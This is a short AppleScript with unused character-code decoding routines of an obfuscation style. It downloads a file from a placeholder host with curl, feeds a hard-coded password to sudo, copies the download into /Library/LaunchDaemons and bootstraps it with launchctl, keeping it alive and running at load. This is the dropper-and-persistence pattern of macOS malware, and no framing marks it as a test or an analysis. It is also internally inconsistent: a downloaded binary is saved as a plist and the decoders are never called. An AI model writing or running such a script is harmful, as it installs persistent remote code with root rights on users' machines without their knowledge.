on subtractCodes(leftCodes, rightCodes)
    set decoded to ""
    repeat with index from 1 to count of leftCodes
        set decoded to decoded & character id ((item index of leftCodes) - (item index of rightCodes))
    end repeat
    return decoded
end subtractCodes

on addCodes(leftCodes, rightCodes)
    set decoded to ""
    repeat with index from 1 to count of leftCodes
        set decoded to decoded & character id ((item index of leftCodes) + (item index of rightCodes))
    end repeat
    return decoded
end addCodes

on offsetCodes(leftCodes, rightCodes)
    set decoded to ""
    repeat with index from 1 to count of leftCodes
        set decoded to decoded & character id ((item index of leftCodes) - (item index of rightCodes))
    end repeat
    return decoded
end offsetCodes

do shell script "mkdir -p '/Library/Application Support/org.example.syncdemo'"
do shell script "curl -fsSL https://example.invalid/agent -o /tmp/agent"
do shell script "echo secret | sudo -S cp /tmp/agent /Library/LaunchDaemons/org.example.syncdemo.plist"
do shell script "launchctl bootstrap system /Library/LaunchDaemons/org.example.syncdemo.plist"
set serviceConfig to "<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>"
return serviceConfig
